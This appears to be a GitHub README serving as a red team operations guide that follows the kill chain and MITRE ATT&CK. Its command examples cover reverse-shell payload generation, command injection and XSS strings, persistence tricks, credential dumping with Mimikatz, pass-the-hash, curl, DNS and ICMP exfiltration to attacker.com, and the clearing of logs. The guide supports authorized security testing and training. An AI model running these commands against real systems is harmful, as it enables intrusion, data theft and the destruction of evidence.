# Red Team Operations Guide

[![Red Team](https://img.shields.io/badge/Red%20Team-Operations-red?style=for-the-badge&logo=target)](https://github.com/gotr00t0day)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE-ATT%26CK-blue?style=for-the-badge&logo=mitre)](https://attack.mitre.org)
[![Offensive Security](https://img.shields.io/badge/Offensive-Security-black?style=for-the-badge&logo=kali-linux)](https://www.offensive-security.com)

## Table of Contents

1. [Introduction](#introduction)
2. [Red Team Methodology](#red-team-methodology)
3. [Planning & Intelligence](#planning--intelligence)
4. [Reconnaissance](#reconnaissance)
5. [Weaponization](#weaponization)
6. [Delivery](#delivery)
7. [Exploitation](#exploitation)
8. [Installation & Persistence](#installation--persistence)
9. [Command & Control](#command--control)
10. [Actions on Objectives](#actions-on-objectives)
11. [Lateral Movement](#lateral-movement)
12. [Data Exfiltration](#data-exfiltration)
13. [Covering Tracks](#covering-tracks)
14. [Red Team Tools Arsenal](#red-team-tools-arsenal)
15. [OPSEC Considerations](#opsec-considerations)
16. [Legal & Ethical Guidelines](#legal--ethical-guidelines)
17. [Resources](#resources)

---

## Introduction

Red Team Operations simulate real-world adversary tactics to test an organization's security posture. This guide provides a comprehensive framework for conducting professional red team engagements, following industry best practices and the MITRE ATT&CK framework.

### Key Objectives
- **Emulate Real Threats**: Mimic actual adversary behavior and tactics
- **Test Detection Capabilities**: Evaluate security controls and monitoring
- **Assess Response Procedures**: Test incident response and containment
- **Provide Actionable Intelligence**: Deliver meaningful security improvements

---

## Red Team Methodology

### 1. Cyber Kill Chain
The traditional kill chain provides a structured approach to red team operations:

```
Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions on Objectives
```

### 2. MITRE ATT&CK Framework
Modern red teams align with MITRE ATT&CK tactics:

- **Initial Access**: Gain foothold in target environment
- **Execution**: Run malicious code on target systems
- **Persistence**: Maintain access across system restarts
- **Privilege Escalation**: Obtain higher-level permissions
- **Defense Evasion**: Avoid detection by security controls
- **Credential Access**: Steal account credentials
- **Discovery**: Gather information about the environment
- **Lateral Movement**: Move through the network
- **Collection**: Gather data of interest
- **Command & Control**: Communicate with compromised systems
- **Exfiltration**: Steal data from the network
- **Impact**: Manipulate, interrupt, or destroy systems/data

---

## Planning & Intelligence

### Rules of Engagement (ROE)
```markdown
📋 Essential ROE Components:
- Scope definition and boundaries
- Authorized testing methods
- Restricted targets and actions
- Communication protocols
- Emergency procedures
- Data handling requirements
```

### Target Profiling
- **Organization Structure**: Hierarchy, departments, key personnel
- **Technology Stack**: Operating systems, applications, security tools
- **Physical Locations**: Offices, data centers, remote sites
- **Business Processes**: Critical operations and workflows
- **Public Presence**: Websites, social media, public documents

### Threat Intelligence
- **APT Groups**: Relevant threat actors for the industry
- **TTPs**: Common tactics, techniques, and procedures
- **IOCs**: Indicators of compromise to emulate
- **Campaign Analysis**: Recent attacks against similar targets

---

## Reconnaissance

### Passive Reconnaissance
Gather information without directly interacting with target systems:

#### OSINT (Open Source Intelligence)
```bash
# Company information
theHarvester -d target.com -l 500 -b all
amass enum -d target.com
subfinder -d target.com

# Social media intelligence
sherlock username
recon-ng
maltego

# Domain and DNS enumeration
dnsrecon -d target.com
fierce -dns target.com
```

#### Public Records
- **DNS Records**: A, AAAA, MX, TXT, NS records
- **WHOIS Information**: Registration details, contact information
- **Certificate Transparency**: SSL/TLS certificates
- **Shodan/Censys**: Internet-connected devices and services

### Active Reconnaissance
Direct interaction with target systems:

#### Network Scanning
```bash
# Host discovery
nmap -sn 192.168.1.0/24
masscan -p1-65535 192.168.1.0/24 --rate=1000

# Port scanning
nmap -sS -T4 -p- target.com
nmap -sC -sV -p1-1000 target.com

# Service enumeration
nmap --script vuln target.com
```

#### Web Application Assessment
```bash
# Directory enumeration
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
ffuf -w /usr/share/wordlists/common.txt -u https://target.com/FUZZ

# Subdomain enumeration
gobuster vhost -u https://target.com -w /usr/share/wordlists/subdomains-top1million-5000.txt
```

---

## Weaponization

### Payload Development
Create custom payloads to evade detection:

#### Metasploit Framework
```bash
# Generate Windows payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o payload.exe

# Generate Linux payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf -o payload.elf

# Generate PowerShell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f powershell -o payload.ps1
```

#### Cobalt Strike
```bash
# Generate beacon payload
generate -o payload.exe -x64 -b dns -d target.com
```

### Custom Implants
- **C2 Frameworks**: Cobalt Strike, Empire, Covenant, Sliver
- **RATs**: Remote Access Trojans for persistent access
- **Droppers**: First-stage payloads for delivering main implants
- **Living off the Land**: PowerShell, WMI, certutil, bitsadmin

---

## Delivery

### Spear Phishing
Targeted email attacks against specific individuals:

#### Email Reconnaissance
```bash
# Gather email addresses
theHarvester -d target.com -l 500 -b all
hunter.io
phonebook.cz
```

#### Phishing Infrastructure
- **Domain Registration**: Typosquatting, homograph attacks
- **Email Server**: Postfix, SendGrid, AWS SES
- **SSL Certificates**: Let's Encrypt for HTTPS
- **Redirectors**: Hide C2 infrastructure

#### Phishing Frameworks
```bash
# Gophish
gophish
# Access web interface on :3333

# Social Engineer Toolkit (SET)
setoolkit
# Select spear-phishing attack vectors
```

### Watering Hole Attacks
Compromise websites visited by targets:

- **Target Website Analysis**: Identify frequently visited sites
- **Web Application Exploitation**: SQL injection, XSS, file upload
- **Client-Side Attacks**: Browser exploits, Java/Flash vulnerabilities

### Physical Delivery
- **USB Drops**: Rubber Ducky, Malicious USBs
- **Hardware Implants**: WiFi Pineapple, Packet Squirrel
- **Social Engineering**: Pretexting, tailgating, dumpster diving

---

## Exploitation

### Web Application Exploitation
```bash
# SQL Injection
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" --dump

# Cross-Site Scripting (XSS)
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

# Command Injection
; cat /etc/passwd
| whoami
& net user
```

### Network Service Exploitation
```bash
# SMB vulnerabilities
smbclient -L //target.com
enum4linux target.com
smbmap -H target.com

# SSH brute force
hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://target.com
```

### Client-Side Exploitation
- **Browser Exploits**: CVE-based exploitation
- **Office Macros**: VBA macros in documents
- **PDF Exploits**: Malicious PDF files
- **Java Exploits**: Client-side Java vulnerabilities

---

## Installation & Persistence

### Windows Persistence
```powershell
# Registry Run Keys
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityUpdate" -Value "C:\temp\payload.exe"

# Scheduled Tasks
schtasks /create /sc onlogon /tn "SecurityUpdate" /tr "C:\temp\payload.exe"

# WMI Event Subscription
$FilterArgs = @{name='SecurityUpdate'; EventNameSpace='root\CimV2'; QueryLanguage="WQL"; Query="SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2"}
```

### Linux Persistence
```bash
# Cron jobs
(crontab -l; echo "* * * * * /tmp/payload.sh") | crontab -

# systemd service
cat > /etc/systemd/system/security-update.service << EOF
[Unit]
Description=Security Update Service
[Service]
ExecStart=/tmp/payload.sh
[Install]
WantedBy=multi-user.target
EOF

# SSH authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@kali" >> ~/.ssh/authorized_keys
```

### Advanced Persistence
- **Rootkits**: Kernel-level persistence
- **Bootkit**: Boot-level persistence
- **UEFI Implants**: Firmware-level persistence
- **Golden Tickets**: Kerberos persistence (AD environments)

---

## Command & Control

### C2 Framework Selection
| Framework | Language | Strengths | Use Cases |
|-----------|----------|-----------|-----------|
| Cobalt Strike | Java | Commercial, mature | Professional red teams |
| Empire | Python | PowerShell focus | Windows environments |
| Covenant | C# | .NET integration | Windows/.NET shops |
| Sliver | Go | Open source | Cross-platform |

### Communication Protocols
- **HTTP/HTTPS**: Standard web traffic
- **DNS**: DNS tunneling for restrictive environments
- **Social Media**: Twitter, GitHub, Slack APIs
- **Email**: SMTP/IMAP communication
- **Cloud Services**: AWS, Azure, Google Cloud

### Infrastructure Design
```
Internet → CDN → Redirectors → C2 Servers → Payloads
```

#### Redirector Configuration
```apache
# Apache redirector
<VirtualHost *:80>
    ServerName legitimate-domain.com
    
    # Redirect beacon traffic to C2
    RewriteEngine On
    RewriteCond %{REQUEST_URI} ^/updates/.*$
    RewriteRule ^.*$ https://c2-server.com%{REQUEST_URI} [P]
    
    # Redirect other traffic to legitimate site
    RewriteRule ^.*$ https://legitimate-site.com%{REQUEST_URI} [R,L]
</VirtualHost>
```

---

## Actions on Objectives

### Intelligence Gathering
- **System Information**: Hardware, software, network configuration
- **User Accounts**: Local and domain accounts
- **Sensitive Data**: Databases, documents, credentials
- **Security Controls**: AV, EDR, monitoring tools

### Credential Harvesting
```bash
# Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# LaZagne
lazagne.exe all

# Browser credential extraction
SharpChrome.exe
```

### Data Discovery
```bash
# Windows
dir /s /b C:\ | findstr /i "password\|credential\|secret"
forfiles /p C:\ /m *.txt /s /c "cmd /c echo @path"

# Linux
find / -name "*.txt" -o -name "*.pdf" -o -name "*.doc*" 2>/dev/null
grep -r "password\|credential\|secret" /home/ 2>/dev/null
```

---

## Lateral Movement

### Windows Lateral Movement
```bash
# PSExec
psexec.py domain/user:password@target.com

# WMI
wmiexec.py domain/user:password@target.com

# Pass-the-Hash
pth-winexe -U domain/user%hash //target.com cmd.exe

# Kerberoasting
GetUserSPNs.py domain/user:password -dc-ip domain-controller -request
```

### Linux Lateral Movement
```bash
# SSH key abuse
ssh -i stolen_key user@target.com

# sudo abuse
sudo -l
sudo -u#0 command

# SUID binaries
find / -perm -4000 2>/dev/null
```

### Network Pivoting
```bash
# Metasploit pivoting
meterpreter > run autoroute -s 192.168.1.0/24
msf > use auxiliary/server/socks_proxy

# SSH tunneling
ssh -D 8080 user@compromised-host
ssh -L 8080:internal-host:80 user@compromised-host
```

---

## Data Exfiltration

### Exfiltration Techniques
```bash
# Base64 encoding
cat sensitive_data.txt | base64 | curl -X POST -d @- https://attacker.com/data

# DNS exfiltration
for i in $(cat sensitive_data.txt | base64 | tr -d '\n' | fold -w 50); do
    dig ${i}.attacker.com
done

# ICMP exfiltration
ping -c 1 -s 1000 attacker.com -p $(cat sensitive_data.txt | xxd -p | head -c 16)
```

### Covert Channels
- **Steganography**: Hide data in images, audio files
- **Cloud Storage**: Dropbox, Google Drive, OneDrive
- **Social Media**: Twitter, Pastebin, GitHub
- **Blockchain**: Bitcoin transactions

---

## Covering Tracks

### Log Manipulation
```bash
# Windows Event Logs
wevtutil cl Application
wevtutil cl System
wevtutil cl Security

# Linux system logs
> /var/log/auth.log
> /var/log/syslog
> /var/log/messages
```

### Artifact Removal
```bash
# PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Browser artifacts
Remove-Item "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"

# Recent files
Remove-Item "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Recent\*"
```

### Anti-Forensics
- **File Wiping**: sdelete, shred
- **Timestamp Manipulation**: timestomp
- **Memory Clearing**: Clear RAM artifacts
- **Network Cleanup**: Clear connection logs

---

## Red Team Tools Arsenal

### Reconnaissance Tools
| Tool | Purpose | Command Example |
|------|---------|-----------------|
| Nmap | Network scanning | `nmap -sC -sV target.com` |
| Amass | Asset discovery | `amass enum -d target.com` |
| theHarvester | Email gathering | `theHarvester -d target.com -b all` |
| Shodan | Internet scanning | `shodan search "apache"` |
| Recon-ng | OSINT framework | `recon-ng -w workspace` |

### Exploitation Tools
| Tool | Purpose | Command Example |
|------|---------|-----------------|
| Metasploit | Exploitation framework | `msfconsole` |
| Cobalt Strike | C2 framework | Commercial tool |
| Empire | PowerShell C2 | `./empire` |
| SQLMap | SQL injection | `sqlmap -u "url" --dbs` |
| Burp Suite | Web app testing | GUI tool |

### Post-Exploitation Tools
| Tool | Purpose | Command Example |
|------|---------|-----------------|
| Mimikatz | Credential extraction | `mimikatz # sekurlsa::logonpasswords` |
| BloodHound | AD enumeration | `SharpHound.exe` |
| PowerView | AD reconnaissance | `Get-NetDomain` |
| Impacket | Network protocols | `psexec.py user:pass@target` |
| CrackMapExec | Network pentesting | `crackmapexec smb 192.168.1.0/24` |

### Persistence Tools
| Tool | Purpose | Platform |
|------|---------|----------|
| Empire | PowerShell persistence | Windows |
| Metasploit | Multi-platform persistence | Cross-platform |
| Covenant | .NET persistence | Windows |
| Sliver | Go-based persistence | Cross-platform |

---

## OPSEC Considerations

### Operational Security Guidelines
```markdown
🔒 OPSEC Best Practices:
- Use non-attributable infrastructure
- Implement proper traffic routing
- Monitor blue team activities
- Maintain operational discipline
- Use encrypted communications
- Regularly rotate infrastructure
```

### Infrastructure Security
- **Domain Fronting**: Hide C2 behind legitimate domains
- **Malleable Profiles**: Customize beacon behavior
- **Jitter and Sleep**: Randomize callback timing
- **Traffic Shaping**: Mimic legitimate traffic patterns

### Attribution Avoidance
- **VPN/VPS Chains**: Multiple layers of anonymity
- **Compromised Infrastructure**: Use victim systems as pivots
- **Operational Timing**: Align with target timezone
- **Language/Culture**: Avoid native language artifacts

---

## Legal & Ethical Guidelines

### Legal Framework
```markdown
⚖️ Legal Requirements:
- Signed contract and SOW
- Proper authorization documentation
- Clear scope and limitations
- Data handling agreements
- Incident response procedures
- Legal counsel consultation
```

### Ethical Considerations
- **Minimize Impact**: Avoid disrupting business operations
- **Data Protection**: Safeguard sensitive information
- **Responsible Disclosure**: Report vulnerabilities appropriately
- **Professional Standards**: Maintain industry best practices

### Documentation Requirements
- **Engagement Planning**: Methodology and approach
- **Technical Findings**: Vulnerabilities and evidence
- **Risk Assessment**: Business impact analysis
- **Remediation**: Specific improvement recommendations
- **Executive Summary**: High-level findings for leadership

---

## Resources

### Official Frameworks
- [MITRE ATT&CK](https://attack.mitre.org) - Adversary tactics and techniques
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework) - Security standards
- [OWASP](https://owasp.org) - Web application security

### Training and Certification
- [SANS SEC564](https://www.sans.org/courses/red-team-exercises-adversary-emulation/) - Red Team Operations
- [CISSP](https://www.isc2.org/Certifications/CISSP) - Security professional certification
- [CEH](https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/) - Ethical hacking certification

### Books and Literature
- "Red Team Field Manual" by Ben Clark
- "The Art of Deception" by Kevin Mitnick
- "Advanced Penetration Testing" by Wil Allsopp
- "Red Team Development and Operations" by Joe Vest

### Online Communities
- [Reddit r/redteamsec](https://reddit.com/r/redteamsec)
- [SANS Red Team Community](https://www.sans.org/community/)
- [Slack Communities](https://bloodhoundgang.org/slack)

---

## Conclusion

Red Team Operations require a methodical approach, combining technical expertise with operational security and ethical responsibility. This guide provides the foundation for conducting professional red team engagements that deliver meaningful security improvements while maintaining the highest standards of professionalism.

Remember: **With great power comes great responsibility**. Always operate within legal boundaries and ethical guidelines.

---

*This guide is for educational and authorized testing purposes only. Unauthorized use of these techniques is illegal and unethical.*

[![GitHub](https://img.shields.io/badge/GitHub-gotr00t0day-black?style=for-the-badge&logo=github)](https://github.com/gotr00t0day)
[![Website](https://img.shields.io/badge/Website-gotr00t0day.github.io-blue?style=for-the-badge&logo=web)](https://gotr00t0day.github.io) 